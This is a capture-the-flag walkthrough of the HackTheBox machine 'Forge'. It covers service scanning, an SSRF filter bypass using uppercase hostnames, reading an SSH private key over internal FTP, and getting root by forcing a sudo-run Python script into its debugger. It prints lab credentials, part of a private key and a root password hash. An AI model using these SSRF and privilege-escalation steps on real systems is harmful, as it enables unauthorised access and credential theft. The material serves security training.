# HackTheBox - Forge

![Screen Shot 2022-01-22 at 09 23 17](https://user-images.githubusercontent.com/87259078/150649013-544d97d7-a411-4de7-8f9f-f03f9b467014.png)

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA scan_all 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.28s latency).
Not shown: 65494 closed ports, 39 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap shows two open ports and hostname. Let’s add that to hosts file and access web server.

![Screen Shot 2021-09-16 at 02.56.19.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/FB4CE01F-8B42-4D86-B5A5-37CB94B94D6B_2/Screen%20Shot%202021-09-16%20at%2002.56.19.png)

Two links, gallery and upload image. There’s nothing much on homepage, so let’s hit upload page.

![Screen Shot 2021-09-16 at 02.57.30.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/4D386CB8-873A-40BB-84C4-063BF43124A4_2/Screen%20Shot%202021-09-16%20at%2002.57.30.png)

We can upload from local machine or from a URL. After uploading any image file from local machine, it gives us the link to the uploaded file.

![Screen Shot 2021-09-16 at 02.58.47.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/A9F2A180-2CCF-450C-8509-5A113158833C_2/Screen%20Shot%202021-09-16%20at%2002.58.47.png)

We can visit that link and view the image. But if we upload any text file, then we can’t view it via browser and it give this below error.

![Screen Shot 2021-09-16 at 03.02.23.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/5F717922-F4BA-4BF3-A480-ACE358BF5C4F_2/Screen%20Shot%202021-09-16%20at%2003.02.23.png)

However, we can view the uploaded text file using curl.

```
⛩\> curl http://forge.htb/uploads/6abKxRF6FlWHrtAuKFUS
test
```

Even if we try to upload any PHP scripts to gain reverse connection then it doesn’t work. Upload from URL is almost same, but it gives out this below error if we use localhost or hostname.

![Screen Shot 2021-09-16 at 03.06.33.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/7EF73816-937E-463E-AB52-1CC0AA1AFDE9_2/Screen%20Shot%202021-09-16%20at%2003.06.33.png)

They have blacklisted hostname and localhost or loopback address. However, if we use uppercase in domain address we can bypass the restriction.

![Screen Shot 2021-09-16 at 03.19.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/AE4F39E3-5673-4F0F-8F2B-91BE3F108A07_2/Screen%20Shot%202021-09-16%20at%2003.19.01.png)

As you can see from above image, we successfully bypassed the address restriction by just using one uppercase/capital from domain address. At this moment it’s not that useful.

Let’s do a VHOST brute force.

```
⛩\> ffuf -u http://FUZZ.forge.htb -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.forge.htb
 :: Wordlist         : FUZZ: /home/kali/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
```

We got one virtual host on same IP. Let’s add this to our hosts file and access it via browser.

![Screen Shot 2021-09-16 at 03.23.09.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/8F163780-891B-4049-9A9B-319EA9B15C38_2/Screen%20Shot%202021-09-16%20at%2003.23.09.png)

Only localhost is allowed to access this virtual host. So, let’s access this via upload from URL.

![Screen Shot 2021-09-16 at 03.24.47.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/A3D0A263-5FF0-4DF2-AAB1-BCA9C0237FC4_2/Screen%20Shot%202021-09-16%20at%2003.24.47.png)

Make sure to use capital or uppercase in VHOST as well as main domain. We got the link, let’s read it via curl.

```
⛩\> curl http://forge.htb/uploads/5xW94mH3GPCoK4hV5d9A
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

This VHOST has two links, ‘announcements’ and ‘upload’. Let’s try to read ‘announcements’ via same method.

![Screen Shot 2021-09-16 at 03.29.20.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/49AC2A25-62FF-478A-A148-B9C9F1425AC9_2/Screen%20Shot%202021-09-16%20at%2003.29.20.png)

Got the link, let’s read it.

```
⛩\> curl http://forge.htb/uploads/5V4KFjOp3xdECTf6jEyD
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

Three things are mentioned here:

- FTP user credentials - user:heightofsecurity123!
- VHOST endpoint ‘upload’ now support FTP & HTTP
- VHOST endpoint 'upload' now have the ability to directly call URL by just adding `?u=` in the address bar

# Initial Access

Now we have FTP creds, let’s try to read current directory of FTP via same method. Below is the URL we pass it from main domain upload from URL function.

`http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@LocalHost/`

Make sure to use capital or uppercase for localhost.

![Screen Shot 2021-09-16 at 03.42.21.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/300C73CF-16D4-4186-9047-49D87BE7CCE0/111AA134-C939-415F-93AD-3F14B4E1A2A6_2/Screen%20Shot%202021-09-16%20at%2003.42.21.png)

We got the link, let’s read with curl.

```
⛩\> curl http://forge.htb/uploads/TQkJiBK2qqaGIK60pz89
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 16 10:50 user.txt
```

It’s working, we can read the present working or default directory of FTP. There’s a user.txt flag and a directory. Let’s see if we can able to read the SSH keys.

`http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@LocalHost/.ssh/id_rsa`

```
⛩\> curl http://forge.htb/uploads/IKmUX1b1APqLfzbpKZVO
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE
7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk
r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D
WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G
```

We can read the public key to find the username.

`http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@LocalHost/.ssh/id_rsa.pub`

```
⛩\> curl http://forge.htb/uploads/YqVi1d7GBHR6uETcN0oB
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdkg75DLB+Cd+2qjlqz6isdb/DVZusbqLoHtO/Y91DT02LE6a0dHeufEei6/j+XWk7aeM9/kZuNUcCwzAkNeYM2Nqpl8705gLsruGvsVXrGVRZOHBwqjSEg5W4TsmHV36N+kNhheo43mvoPM4MjlYzAsqX2fmtu0WSjfFot7CQdhMTZhje69WmnGycK8n/q6SvqntvNxHKBitPIQBaDmA5F+yqELcdqg7FeJeAbNNbJe1/ajjOY2Gy192BZYGkR9uAWBncNYn67bP9U5unQggoR+yBf5xZdBS3xEkCcqBNSMYCZ81Ev2cnGiZgeXJJDPbEvhRhdfNevwaYvpfT6cqtGCVo0V0LTKQtMayIazX5tzqMmIPURKJ5sBL9ksBNOxofjogT++/1c4nTmoRdEZTP5qmXMMbjBa+JI256sPL09MbEHqRHmkZsJoRahE8tUhv0SqdaHbv2Ze7RvjNiESD6fIMrq6L+euZFhQ5p2AIpdHvOUSbeaCPiG7hwVqwf8qU= user@forge
```

Alright, we go the SSH private key. Let’s login and read user flag.

```
⛩\> chmod 600 id_rsa_user

⛩\> ssh -i id_rsa_user user@forge.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6

user@forge:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)

user@forge:~$ cat user.txt
da816c0176a686ae53f95e0ac2918377
```

# Privilege Escalation

```
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Current user got the permission to run python as root. Let’s read the python file.

```
user@forge:~$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

> TL;DR
Upon executing this script, it opens up a random port from the pool (1024-65535) and it only listens on 127.0.0.1. Authentication is in place to access the menu, and there are 4 options in the menu and upon selecting they execute specific commands. If an error occurs then it gives us the python debugger (PDB). As this script is being executed with root privileges we can manage to gain shell via PDB.

For this exploit we need to two SSH access, one we execute the script and an to connect to the open port.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:33880
```

As you can see upon script execution it opened a random port locally. Now from an SSH shell, we need to connect that port via netcat.

```
user@forge:~$ nc 127.0.0.1 33880
Enter the secret passsword:
```

As you can see we successfully connected to the port and it is asking the password. Get the password from python script and provide it.

```
user@forge:~$ nc 127.0.0.1 33880
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

It gives you this menu, now we need to trigger the error. Input any special character and press enter.

```
user@forge:~$ nc 127.0.0.1 33880
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
%
```

Now check the first SSH shell, we dropped into PDB (python debugger). Now we can run python modules.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:33880
invalid literal for int() with base 10: b'%'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)
```

Let’s import ‘os’ module and gain shell access of root and read the final flag.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:33880
invalid literal for int() with base 10: b'%'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system('/bin/bash')

root@forge:/home/user# id
uid=0(root) gid=0(root) groups=0(root)

root@forge:/home/user# cd

root@forge:~# cat root.txt
2b501da42e72a1c2ab0c3d29ae84a426
```

```
root:$6$Msvc2unlR99fWBAX$boGTeFujypU5XzdRYTBwRdGEUanryagtjUScvHxCfJ.Jt44iwzJhad4rWhXMahebHXA6CSH3Nlr64tpusii6O/:18780:0:99999:7:::
```

